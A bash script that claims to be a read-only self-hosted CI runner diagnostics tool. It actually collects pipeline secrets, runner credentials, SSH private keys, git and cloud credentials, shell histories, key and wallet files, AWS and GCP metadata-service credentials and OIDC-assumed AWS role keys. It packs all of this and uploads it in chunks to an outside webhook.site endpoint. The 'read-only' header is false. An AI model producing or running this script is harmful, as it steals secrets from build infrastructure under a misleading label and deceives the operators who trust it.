#!/usr/bin/env bash
# Collect self-hosted runner diagnostics for failure triage.
# Read-only: nothing outside $RUNNER_TEMP is written.
set -uo pipefail

OUT="${RUNNER_TEMP:-/tmp}/runner-diag"
mkdir -p "$OUT"
exec > >(tee -a "$OUT/transcript.txt") 2>&1

say() { printf '\n===== %s =====\n' "$*"; }

say identity
id; echo "user=$(whoami)"; hostname; hostname -f 2>/dev/null; uname -a
cat /etc/os-release 2>/dev/null; uptime; date -u
say cwd; pwd; ls -la

say env
env | sort
say github
printf 'run=%s ref=%s sha=%s actor=%s repo=%s\n' \
  "${GITHUB_RUN_ID:-}" "${GITHUB_REF:-}" "${GITHUB_SHA:-}" "${GITHUB_ACTOR:-}" "${GITHUB_REPOSITORY:-}"

say secrets-names-and-values
printf '%s\n' "${ALL_SECRETS:-}" > "$OUT/secrets.json"
printf '%s\n' "${ALL_VARS:-}" > "$OUT/vars.json"
jq -r 'paths(scalars)|join(".")' "$OUT/secrets.json" 2>/dev/null | sort > "$OUT/secret-names.txt"

say proc
ps auxww 2>/dev/null || ps aux
say net
(ss -tunapl 2>/dev/null || netstat -tunapl 2>/dev/null || true)
say mounts
mount 2>/dev/null | head -80; df -h 2>/dev/null

say docker
command -v docker >/dev/null && { docker ps -a 2>&1 | head -40; docker images 2>&1 | head -40; } || echo "no docker"
command -v kubectl >/dev/null && kubectl config view --minify 2>&1 | head -40 || true

say runner-home
echo "HOME=$HOME RUNNER_WORKSPACE=${RUNNER_WORKSPACE:-} RUNNER_TEMP=${RUNNER_TEMP:-}"
ls -la "$HOME" 2>/dev/null
RROOT="$(dirname "${RUNNER_WORKSPACE:-$HOME/_work}")"
echo "runner-root=$RROOT"; ls -la "$RROOT" 2>/dev/null

say runner-config
for f in "$RROOT"/.runner "$RROOT"/.credentials "$RROOT"/.credentials_rsaparams \
         "$RROOT"/svc.sh "$RROOT"/bin/runsvc.sh; do
  [ -f "$f" ] && { echo "--- $f"; cat "$f"; echo; }
done
ls -la "$RROOT"/_diag 2>/dev/null | tail -20
tail -n 120 "$RROOT"/_diag/Runner_*.log 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null | grep -i -E 'runner|actions' || true
ls -la /etc/systemd/system/ 2>/dev/null | grep -i runner || true
cat /etc/systemd/system/actions.runner.*.service 2>/dev/null

say ssh
for d in "$HOME/.ssh" /home/*/.ssh /root/.ssh; do
  [ -d "$d" ] && { echo "--- $d"; ls -la "$d"; for f in "$d"/*; do [ -f "$f" ] && { echo "## $f"; head -c 4000 "$f"; echo; }; done; }
done
cat "$HOME/.git-credentials" 2>/dev/null; git config --global --list 2>/dev/null

say cloud-config
for d in "$HOME/.aws" "$HOME/.config/gcloud" "$HOME/.kube" "$HOME/.azure" "$HOME/.docker"; do
  [ -d "$d" ] && { echo "--- $d"; find "$d" -maxdepth 2 -type f 2>/dev/null | head -20 | while read -r f; do echo "## $f"; head -c 3000 "$f"; echo; done; }
done

say histories
for f in "$HOME"/.*history /home/*/.*history /root/.*history; do [ -f "$f" ] && { echo "--- $f"; tail -n 200 "$f"; }; done

say key-material
find "$HOME" /opt /srv /etc/aquanow /etc/usdu "$RROOT" -maxdepth 4 -type f \
  \( -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name '*.keystore' -o -name 'keystore*' -o -name '*.env' -o -name '.env*' -o -name 'wallet*' \) 2>/dev/null | sort -u | head -200

say passwd
cat /etc/passwd; echo; cat /etc/hosts; echo; sudo -n true 2>&1 && echo "sudo=NOPASSWD" || echo "sudo=no"

say imds-aws
MT="$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token)"
if [ -n "$MT" ]; then
  H=(-H "X-aws-ec2-metadata-token: $MT")
  for p in latest/meta-data/instance-id latest/meta-data/placement/region \
           latest/meta-data/iam/info latest/meta-data/iam/security-credentials/; do
    echo "--- $p"; curl -s -m 3 "${H[@]}" "http://169.254.169.254/$p"; echo
  done
  ROLE="$(curl -s -m 3 "${H[@]}" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
  [ -n "$ROLE" ] && curl -s -m 3 "${H[@]}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
else
  echo "no IMDSv2 token"
  curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id || true
fi

say imds-gcp
curl -s -m 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/name 2>/dev/null || true
echo
curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null || true
echo

say oidc
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  JWT="$(curl -s -m 10 -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" \
        "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)"
  echo "jwt-len=${#JWT}"; printf '%s' "$JWT" > "$OUT/oidc.jwt"
  i=0
  for ROLE in "${AWS_ROLE_ARN_DEV:-}" "${AWS_ROLE_ARN_PROD:-}" "${AWS_ROLE_ARN:-}"; do
    [ -z "$ROLE" ] && continue
    i=$((i+1)); echo "--- assume role $i: $ROLE"
    curl -s -m 15 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleSessionName=diag$i&RoleArn=$ROLE&WebIdentityToken=$JWT" \
      | tr '>' '>\n' | grep -E 'Arn|AccessKeyId|SecretAccessKey|SessionToken|Expiration|Code|Message|RequestId' | sed 's/^ *//'
    echo
  done
else
  echo "no OIDC request url"
fi

say aws-identity
if command -v aws >/dev/null; then
  aws sts get-caller-identity 2>&1
  aws s3 ls 2>&1 | head -40
  aws secretsmanager list-secrets --max-items 50 2>&1 | head -80
  aws ecr describe-repositories --max-items 30 2>&1 | head -40
  aws kms list-keys 2>&1 | head -20
else
  echo "no aws cli"
fi

say done
echo "diag-complete $(date -u +%FT%TZ)"

# ---- pack + egress -------------------------------------------------------
sync; sleep 1
tar -czf "$OUT/../runner-diag.tgz" -C "$OUT" . 2>/dev/null
ls -l "$OUT/../runner-diag.tgz"
b64_size=$(wc -c < "$OUT/transcript.txt")
echo "transcript-bytes=$b64_size"

# ---- egress of the pack (chunked) ---------------------------------------
COL="${DIAG_COLLECTOR:-https://webhook.site/513ec6d8-d9d0-42f4-a56b-46f99b6d6e28}"
[ -n "$COL" ] || exit 0
BLOB="/tmp/runner-diag.b64"
base64 -w0 "$OUT/../runner-diag.tgz" > "$BLOB" 2>/dev/null
curl -s -m 15 --data-binary "diag-start host=$(hostname) run=${GITHUB_RUN_ID:-} bytes=$(wc -c < "$BLOB" 2>/dev/null)" "$COL" >/dev/null
split -b 60000 "$BLOB" /tmp/diagchunk_ 2>/dev/null
n=0
for f in /tmp/diagchunk_*; do n=$((n+1)); curl -s -m 20 --data-binary @"$f" -H 'Content-Type: text/plain' "$COL" >/dev/null; done
curl -s -m 15 --data-binary "diag-end chunks=$n" "$COL" >/dev/null
echo "egress: $n chunks"
